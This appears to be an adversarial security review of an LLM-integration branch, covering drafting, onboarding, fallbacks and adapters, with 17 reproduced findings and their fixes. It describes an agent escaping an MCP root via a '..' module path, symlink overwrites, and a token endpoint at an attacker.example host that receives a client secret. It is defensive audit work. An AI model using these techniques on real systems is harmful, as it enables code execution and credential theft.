# M3 adversarial review: models, release, onboarding, context and drafting (ADR-0074..0078)

Branch `claude/llm-integration-f45873`. The new work is the five commits after `617f361`; `git diff origin/main...HEAD` also contains older, already-merged history. Scope: `packages/llm`, the workflow fallback and release changes, `packages/onboard`, `PostgresTableAdapter`, HTTP Actions, `devkit` context and paths, `typesys_compile_context`, drafting (`draft.ts`, CLI, MCP), and the docs that describe them.

## Summary

I found 17 defects: 3 High, 5 Medium and 9 Low. 14 have a reproduction. Each one was a scratch vitest file under `packages/<pkg>/test/zz-review-*.test.ts`, run alone. All of those files were deleted afterwards, and `git status --short` was clean. The rest are shown from the code and say so.

The three High findings:

- **H1.** The new MCP drafting tool imports a host module from outside its root. This brings back the P3-E1b escape that plan and scaffold already block.
- **H2.** A configured drafting model falls back to a model whose audience was never decided. Drafting labels runtime-released context `{ markings: [] }`, so any fallback is admitted.
- **H3.** A model's pending sensitive flag downgrades a TOP SECRET marking to SECRET in the built pack.

On the `needsAttention` question: it is **not a release leak**, given ADR-0052, ADR-0067 and ADR-0075. The reasoning is at the end.

---

## High

### H1. `typesys_engineer_draft` imports a host module outside the MCP root (package-relative `..` climb)
- **Where:** `packages/engineer/src/mcp.ts:117` and `packages/engineer/src/cli.ts:118`.
- **What fails:** `draftTool` checks `host.module` only when it starts with `.` or is absolute. It then calls `engineerCommand(["draft", …])`, and `draftCommand` loads the host with `tryLoadHost({ host: brief.host }, dir)` **without `{ within: root }`**. That skips the guard in `host.ts:37`, the one that refuses a package specifier with `..` segments. An agent using the engineer MCP server writes a brief with `host.module: "esbuild/../../…/outside/evil.mjs"` and calls `typesys_engineer_draft`. The server imports and runs that module.
- **Evidence (repro):** I used the same setup as `p3-engineer.test.ts` P3-E1b, but called `typesys_engineer_draft` instead of plan. The output was `draft marker exists: true`. The module ran and the call then failed with `…evil.mjs.build() did not return { runtime, registry, policyEngine }`.
- **Fix:** Pass `{ within: root }` from the MCP path into `draftCommand` → `tryLoadHost`. Better, give `draftCommand` a `within` option that `draftTool` always sets. Add P3-E1/E1b-style tests for the draft tool.

### H2. Drafting (and onboarding) with a configured model sends what only the primary's audience may receive to its fallbacks
- **Where:**
  - `packages/engineer/src/draft.ts:206-216`: the context is compiled for `lm.info.audience`, then sent with `label: { markings: [] }`.
  - `packages/engineer/src/cli.ts:133` and `packages/onboard/src/command.ts:186`: `createLlm(config).model(id, "development")`, with fallbacks on by default.
  - `packages/llm/src/llm.ts:280-290`: a fallback is admitted on the label alone.
- **What fails:** The draft context is released by the runtime for the primary model's audience. The request is then labeled "unmarked". When the primary is unavailable, `withFallbacks` admits any fallback in the same boundary. For a fallback outside the boundary, `crossBoundaryFallback` plus any label is enough. `decideRelease(…, { markings: [] })` allows everything, so the fallback receives values its own audience was never decided for. This contradicts ADR-0075: "Each fallback is admitted as if called directly: … the content releasable to its audience". Onboarding's `refine` has the same pattern (`refine.ts:99`, label defaults to `[]`). There it exposes metadata, including comments such as `CLASSIFIED: SECRET …`.
- **Evidence (repro):**
  - Setup: two `private` models. `enclave` has audience roles `ai-enclave` and clearance CUI, with `fallbacks: ["spare"]`. `spare` has no audience, so it is granted nothing. I ran `draftMission(brief, loaded, llm.model("enclave", "development"))` with `enclave` down.
  - Result: `rounds answered by: spare`, and `spare (granted nothing) was sent maintenanceStatus values: true`. The prompt header read "reading for model:squadron-enclave/triage".
  - Control: the same `spare` model called directly is shown `(none readable)`.
- **Fix:**
  - Drafting and onboarding should call `.model(id, use, { fallback: false })` and handle fallbacks themselves by recompiling the context for each fallback's audience, as the workflow engine does.
  - Alternatively, `withFallbacks` should refuse a fallback whose audience differs from the primary's unless the caller supplies a per-audience request builder.
  - Content the runtime released should never be labeled `{ markings: [] }`, because that label tells the llm layer the content is unmarked for every audience.

### H3. A model's sensitive flag downgrades a marking the evidence states (TOP SECRET → SECRET), and it applies while still pending
- **Where:**
  - `packages/onboard/src/refine.ts:263`: grounding uses the regex `\bSECRET\b`, which matches inside "TOP SECRET".
  - `refine.ts:268`: a model item is skipped only when the category is the same.
  - `packages/onboard/src/build.ts:127`: the last sensitive item with a marking overwrites `x-provenance` for the property.
  - `review.ts:101-107`: sensitive flags apply until an expert rejects them.
- **What fails:** A column comment says `CLASSIFIED: TOP SECRET`, and the baseline proposes `classified` / TOP SECRET. The model adds `{ field, category: "location", marking: "SECRET", cites: [field] }`. That passes as "stated by the evidence", is appended after the baseline item, and wins in `buildDomain`. The installed pack marks the property SECRET, and no expert has accepted it. The ADR says "a sensitive flag can be added, never removed". In practice the model removed the higher marking.
- **Evidence (repro):** The input was a JSON Schema field with the description "Grid reference. CLASSIFIED: TOP SECRET". The expert accepted only the Type and its properties.
  - `proposal sensitive: [["…:classified","TOP SECRET","baseline"],["…:location","SECRET","model"]]`
  - `rejected: []`
  - `built x-provenance: {"properties":{"loc":{"classification":"SECRET"}}}`
- **Fix:**
  - In `buildDomain`, keep the most restrictive marking per property, using the scheme's order or the fixed `MARKINGS` order.
  - In `applyRefinement`, refuse a model marking lower than one already on the field.
  - Match a marking as a whole: "SECRET" must not be found inside "TOP SECRET", and the same applies in `sensitivityHints`.

## Medium

### M1. Onboarded HTTP Actions return the service's raw body to the person, including fields the generated policies withhold
- **Where:**
  - `packages/adapter-http/src/http-adapter.ts:310-345`: the parsed body is returned as is.
  - `packages/onboard/src/build.ts:96-107`: the generated Action has `outputSchema: { type: "object" }` and `outputType: t.name`.
  - `packages/core/src/runtime/runtime.ts`, `invokeAction`: results are filtered only when `identity.audience` is set.
- **What fails:** Onboarding generates `mx.personal-name` for `full_name` and withholds it on reads. The same onboarding generates `ChangeDutyStatus`, whose result is the roster's raw JSON. A caller allowed to invoke the Action but denied `mx.personal-name` gets the name back. The raw keys (`full_name`, `home_unit`) are not even the model's property names. For an audience-bound caller, `releaseActionResult` compares raw keys with property names. Almost everything is dropped, except keys like `id` and `callsign` that happen to match, so audiences get an unusable result.
- **Evidence (repro):** I used the committed example (catalog, roster OpenAPI, recorded answer, review) and a fake fetch that returns the member as the roster's duty endpoint does with a PII-scoped client.
  - The read as `without("mx.personal-name")` returns `{"id":"C-1001","callsign":"VIPER","qualifications":[…],…}`, with no name.
  - The Action result to the same caller is `{"id":"C-1001","callsign":"VIPER","full_name":"Capt Dana Reyes",…}`.
- **Fix:** Have `HttpAdapter.executeAction` map the response through the Type's `fields` pointers, as reads do, so the result is canonical. For an Action with `outputType`, release the result to every caller as a read of that object, not only to audiences. A plain `{ ok }` or `{}` would also be acceptable.

### M2. Planner diagnostics sent back to the drafting model disclose object existence and hidden Type names
- **Where:**
  - `packages/engineer/src/plan.ts:58`: the whole model via `describeModel(host.registry)`.
  - `plan.ts:160-171`: existence is checked as each caller, without the model's audience.
  - `packages/engineer/src/draft.ts:231-232`: errors go back to the model.
- **What fails:** ADR-0077 says the model is told only what its author may share with it, and that a model granted nothing "is told only what needs no grant". The repair rounds break this in two ways:
  - The model can probe ids. `No airforce.Aircraft "AF99-0000" exists` comes back for a missing id, and nothing comes back for an existing one, so the model learns which objects exist, including objects it may not read.
  - Under need-to-know discovery, "did you mean" names Types the model's context left out.
- **Evidence (repro):**
  - With no `agentAudience`, the first prompt said `(none readable)` and did not mention AF86-0212. The repair message contained `unknown-object … No airforce.Aircraft "AF99-0000" exists` and said nothing about AF86-0212.
  - With `discovery: "need-to-know"`, the context's TYPES section was empty. The repair hint was `No Type "airforce.WorkOrdr" in the model (did you mean "airforce.WorkOrder"?)`.
- **Fix:** When drafting, compute plan diagnostics for `withAudience(author, model.audience)`: describe the model as that identity, check existence as that identity, and build "did you mean" only from what it was told. Diagnostics that depend on what other callers can see should go to the person, not into the prompt.

### M3. `llm.select()` constraints are not applied to the selected model's fallbacks
- **Where:** `packages/llm/src/llm.ts:182-201` (`select` → `llm.model(best.id, req.use)`) and `llm.ts:280-290` (`admissible` checks use, boundary, capabilities and label only).
- **What fails:** `select({ retention: ["zero-data-retention"] })` rejects the non-ZDR model and returns the ZDR one, but with its configured fallbacks attached. When it is unavailable, the request goes to the model `select` had just rejected. The same applies to `environments`, `minQuality` and `maxOutputPricePerMillion`.
- **Evidence (repro):**
  - `considered: [{"id":"safe"},{"id":"keeps","rejected":"retention is provider-default"}]`
  - `answered by: keeps | retaining provider received: 1`
- **Fix:** Have `select` return `llm.model(id, use, { fallback: false })`, or wrap it with only the fallbacks that also pass `rejection(m, req, env)`.

### M4. Files derived from a checked path are written through symlinks outside the MCP root
- **Where:**
  - `packages/engineer/src/cli.ts:139` (`<out>.draft.json`) and `cli.ts:149` (`<out>.request.txt`).
  - `packages/onboard/src/command.ts:181,199-205` (`proposal.json`, `pending.json`, `approved.json`, `pack.json`, `adapters.json`, `checks.json`, `recording.json` under `--out`).
- **What fails:** `insideRoot` is applied only to `out` itself. Files the command writes next to it, or inside it, are not checked. If one of them is a symlink to a path outside the root, the agent overwrites that file with server-chosen content. `docs/completeness.md` says onboarding's MCP "test shows paths confined to its root".
- **Evidence (repro):**
  - Engineer: with `root/m.request.txt` a symlink to `outside/victim.txt`, `typesys_engineer_draft { out: "m.json" }` overwrote the victim (`"SYSTEM:\nYou turn a requirement…"`). The tool then returned `… m.request.txt is outside the server's root`, but only after the write had happened.
  - Onboard: with `root/run/proposal.json` a symlink to an outside file, `typesys_onboard_propose` returned `ok: true`, and the victim now starts `{"format": "typesys.onboarding/1"…`.
- **Fix:** Check every written path with `insideRoot` before writing, or open with `O_NOFOLLOW` (`fs.open(p, "wx")` after unlinking an existing symlink). Add a test per tool.

### M5. An OpenAPI `tokenUrl` that is absolute sends the client secret to that host, over plain HTTP if it says so
- **Where:** `packages/onboard/src/build.ts:201` (`tokenPath: s.auth.tokenUrl`, straight from the collected document) and `build.ts:236` (`new URL(plan.auth.tokenPath, baseUrl)`).
- **What fails:** The field is named `tokenPath`, as if it were relative to the deployment's base URL. An absolute `tokenUrl` in the collected document, which can be fetched over `--openapi https://…`, wins over the base. `adaptersFor` then posts `client_id` and `client_secret` there. Nothing in `adapters.json` review or `check` flags a host that differs from the base URL.
- **Evidence (repro):** With `tokenPath: "http://collector.attacker.example/token"`, base `https://roster.internal/api/`, and a fake fetch, a read produced `POST http://collector.attacker.example/token grant_type=client_credentials&client_id=client&client_secret=TopSecretClientSecret`.
- **Fix:** Accept only a path (no scheme or host) as `tokenPath`, or require the token URL's origin to equal the base URL's, unless a deployment variable names a different token URL. Refuse `http:` for a non-loopback host, as `resolveConfig` already does for models.

## Low

### L1. `isLoopback` treats any hostname starting `127.` as loopback
- **Where:** `packages/llm/src/config.ts:242-248`, `/^127\./.test(host)` on the hostname string.
- **What fails:** `http://127.attacker.example:11434/v1` resolves as `environment: "local"`, with no `environment-mismatch` and no `insecure-base-url` diagnostic. "Local" governs fallback boundaries (ADR-0075).
- **Evidence (repro):** `environment: local diagnostics: []`.
- **Fix:** Treat only an IPv4 literal in 127.0.0.0/8 as loopback, plus `localhost` and `::1` (`net.isIP(host) === 4 && host.startsWith("127.")`).

### L2. Ollama and OpenRouter discovery errors do not redact configured header secrets
- **Where:** `packages/llm/src/providers/openai-chat.ts:205` (`normalizeSdkError(…, provider, [])`).
- **What fails:** A server that echoes a custom header (a gateway tenant key given as `{ env }`) shows it in the error message, and in `llm.validate()`'s `provider-unreachable` diagnostic. The SDK path passes `secretValues(...)`; this path passes `[]`.
- **Evidence (repro):** A loopback server answered 401 with the header echoed. The result was `box answered 401: denied for tenant key tenant-9f8e7d6c5b4a`.
- **Fix:** Pass `secretValues(provider, secrets)` into `getJson`.

### L3. The context compiler never says a computed value is withheld; ADR-0078 says it is "observed like any value"
- **Where:** `packages/devkit/src/context.ts:180-181` (visibility covers only stored `values`) and `context.ts:223` (computed lines carry no marker).
- **What fails:** The context tells a viewer's agent `readinessStatus (computed from maintenanceStatus): "FMC" | …` with no `[not returned to this caller]`, although the viewer is returned it on none of the probed objects. This is the "code that reads a value the caller never receives" problem the ADR sets out to prevent.
- **Evidence (repro):** For the viewer, the context lists `maintenanceStatus … [not returned to this caller]`, then `readinessStatus (computed from maintenanceStatus): …` without a marker. The same query returned `readinessStatus on 0 of 2`.
- **Fix:** Include computed names in `returned` and `neverReturned`, and mark them in `renderType`.

### L4. `compileContext` exceeds `maxTokens` when the header is large; the docs say it "keeps its budget"
- **Where:** `packages/devkit/src/context.ts:138` (the loop stops once no items are left).
- **What fails:** The task text is in the header, and so is the "LEFT OUT" list. With a long task, every item is dropped and the result is still over budget. `typesys_compile_context` does not bound `task`.
- **Evidence (repro):** A 3,600-character task with `maxTokens: 500` gave `tokens 1097 budget 500; types 0 omitted 6`.
- **Fix:** Truncate the echoed task, and cap or summarise the omitted list. Alternatively, refuse with a clear error when the fixed text alone exceeds the budget.

### L5. The workflow engine falls back on `malformed-response`, which the llm layer and ADR-0075 do not
- **Where:** `packages/workflow/src/engine.ts` (the `attempt` loop: `!isRetryable(err)` decides fallback) and `packages/llm/src/errors.ts:30` (`malformed-response` is retryable by default).
- **What fails:** ADR-0075 says only `unavailable`, `overloaded`, `rate-limited` and `timeout` fall back, and `withFallbacks` uses that set. In a workflow, any error with `retryable: true` moves to the next model, including `malformed-response` from `workflowModel`. The comment in `packages/llm/src/workflow.ts:30-31` says this mapping exists, but it does not.
- **Evidence:** Code reading only, not reproduced.
- **Fix:** In `workflowModel.complete`, rethrow LlmErrors outside `FALLBACK_CODES` with `retryable: false`, or check the code in the engine.

### L6. The `PostgresTableAdapter` `eq` pushdown compares untrimmed text while values are returned trimmed
- **Where:** `packages/adapter-postgres/src/postgres-table-adapter.ts:150` (`col::text = $n`) and `postgres-table-adapter.ts:212` (`trimEnd()`).
- **What fails:** An object read with `code: "ABC"`, whose stored value is `"ABC  "`, is not found by `filter code eq "ABC"`. The same condition inside an `or`, which is not pushed down, finds it. Results depend on the shape of the filter.
- **Evidence (repro, local PostgreSQL 5433):** `object 1 code: "ABC" | eq query finds: [] | same condition in an or finds: [ '1' ]`.
- **Fix:** Push down `rtrim(col::text) = $n`, or push down only for columns returned unchanged.

### L7. The HTTP adapter drops a base URL's path; onboarding ignores OpenAPI `servers`
- **Where:** `packages/adapter-http/src/http-adapter.ts:213,324` (`new URL("/members/1", "https://host/api/")` gives `https://host/members/1`) and `packages/onboard/src/sources.ts` (no handling of `servers`).
- **What fails:** A service whose OpenAPI `servers` URL has a path cannot be served by setting `<ID>_BASE_URL` to that URL. Reads, and now Actions, go to the host root. This was already true for reads; Actions inherit it.
- **Evidence:** The M5 repro output shows `GET https://roster.internal/members/1` for base `https://roster.internal/api/`.
- **Fix:** Join paths relative to the base (strip the leading `/` and make sure the base ends with `/`). Record the `servers` URL's path in the adapter plan.

### L8. A rerun's `proposal.json` changes even when nothing in the sources did
- **Where:** `packages/onboard/src/refine.ts:108` (`refinedBy.callId` from `randomUUID()`, `at` from the clock) and `packages/onboard/src/command.ts:180` (`recording.json` `at` is `new Date()`).
- **What fails:** ADR-0076 says "a rerun shows only what changed in the sources". Every `propose` with a model or `--answer` rewrites `proposal.json` with a new call id and time, so the committed diff is never empty.
- **Evidence:** Code reading only, not reproduced.
- **Fix:** Leave call ids and times out of `proposal.json` (keep `requestDigest` and the model id), or write them to a separate run log.

### L9. Onboarding's CLI and MCP cannot label marked metadata; the ADR's release claim holds only through the API
- **Where:** `packages/onboard/src/command.ts:185-193` (no `--label`, `requireLabels` or classification is passed to `createLlm`) and `refine.ts:99`.
- **What fails:** ADR-0076 says "the request is labeled (ADR-0075), so a deployment whose metadata is itself marked is refused a model that may not receive it". From `typesys onboard propose --model` and `typesys-onboard-mcp`, the label is always `[]` and there is no scheme. Evidence text such as `CLASSIFIED: SECRET when populated` therefore goes to any configured development model, hosted ones included, and to its fallbacks (see H2).
- **Evidence:** Code reading only, not reproduced.
- **Fix:** Add `--label <marking>` and pass the deployment's scheme and `requireLabels`. Alternatively, derive a label from the markings found in the evidence: if `sensitivityHints` found SECRET, label the request SECRET.

---

## On `needsAttention` in drafting context (asked to decide)

**Not a release leak.** The context compiler does not compute values. It reports what `runtime.query` returns to `withAudience(author, model.audience)`. The runtime returns `needsAttention` without `maintenanceStatus` because `Aircraft.needsAttention` declares `releases: ["maintenanceStatus"]` (ADR-0052): the domain author's reviewed and audited assertion that the one bit may go "to whoever can read the object".

Under ADR-0067, the audience is decided at the same enforcement point, with the same rules, as the person. The derivation check calls `memberReadable`, which evaluates for both principals, so a declared release lifts the input's policy for the audience exactly as it does for a viewer. The drafting audience in the example holds the viewer role, and a viewer is meant to get this bit. A model the object policy refuses gets nothing; the commercial model is refused the Aircraft outright, and I checked this. ADR-0078 states this case explicitly ("a computed value may be returned while a value it depends on is not, as the runtime decides").

Two caveats belong in the docs rather than in a fix here:

- `releases` is not audience-aware, so a domain cannot release a bit to people but not to models.
- `computeNeedsAttention` also reads WorkOrders through `ctx.getAdapter`. ADR-0052 documents these reads as ungoverned, so the bit also reflects maintenance data the audience may not read.

The real gap near this question is L3: the compiler never says when a computed value is withheld.

## Not substantiated, dropped

- SQL injection in `PostgresTableAdapter`. Identifiers are validated by regex and quoted, and values are parameterized.
- HTTP Action path traversal. Values are `encodeURIComponent`-ed, `.` and `..` are refused, and `%` is encoded, so dot segments cannot be smuggled in.
- Replay answering a different request. The key covers the whole adapter request, model included.
- Connection-string leaks from `onboard collect`. Only the variable name and the error code are reported.

---

## Disposition (2026-10-16)

All 17 findings are fixed on this branch, each with a test that fails without its fix.

- **H1:** `typesys_engineer_draft` loads the host with the MCP root as `within`, the same guard plan and scaffold use (`draft.test.ts`, "H1").
- **H2:** A request can now say which audience its content was read for (`GenerateRequest.releasedFor`, ADR-0075). Only a model with that audience id receives it, so a fallback with another audience is refused whatever the label. A deployment can give several models one audience id to let them stand in for each other. Drafting sets it (`release-binding.test.ts`; `draft.test.ts`, "H2"). Onboarding's refinement sends metadata under the label its caller gives; L9 makes that label reachable from the CLI and MCP.
- **H3:** A marking is matched as a whole term, so `SECRET` inside `TOP SECRET` does not count. A model may not mark a field lower than it is already marked, and the build keeps the most restrictive marking (`onboard.test.ts`).
- **M1:** An HTTP Action whose output Type the adapter maps returns that object, mapped as a read maps it. An Action that declares an `outputType` has its result released to a person as a read of that object, not only to an audience (`http-actions.test.ts`, `onboard-postgres.test.ts`).
- **M2:** What goes back to the drafting model never says whether an object exists. A "did you mean" hint naming something outside the model's context is dropped. The person still sees both (`draft.test.ts`, "M2").
- **M3:** `select()` falls back only to models that meet the same requirements (`release-binding.test.ts`).
- **M4:** Every file the draft and onboarding tools write is checked against the root as it is written, so a symlink planted at a name the tool chooses is refused (`draft.test.ts`, `command.test.ts`).
- **M5:** The client secret is posted only to the base URL's origin. A token endpoint elsewhere is refused when the adapter is built.
- **L1:** Only an IPv4 address in 127/8, `::1` or `localhost` counts as this machine.
- **L2:** Ollama and OpenRouter discovery errors are redacted with the provider's secrets.
- **L3:** A computed value the caller is never returned is marked in the context.
- **L4:** A long task is shortened in the context header to keep the budget. A budget smaller than the rules alone is refused.
- **L5:** An AI step falls back to its next model only when the model is unavailable (`unavailable`, `overloaded`, `rate-limited`, `timeout`), not on a malformed answer.
- **L6:** `eq` pushdown and ids are trimmed as read values are, so `eq` finds what a read shows. Ids from `char(n)` keys are no longer padded in queries.
- **L7:** Onboarding keeps the path of an OpenAPI document's first server and prefixes it to every mapped path.
- **L8:** `refinedBy` holds the model and digests only, so a rerun that asks the same question gives the same proposal.
- **L9:** `typesys onboard request|propose --marking` (and `markings` over MCP) labels the metadata. Marked metadata is not shown to a coding agent, which is granted nothing.

One consequence of the L3 change: the drafting example's context now marks withheld computed values, so its recorded request changed. The agent's two answers are unchanged and were recorded again against the new request. The drafted mission is identical.
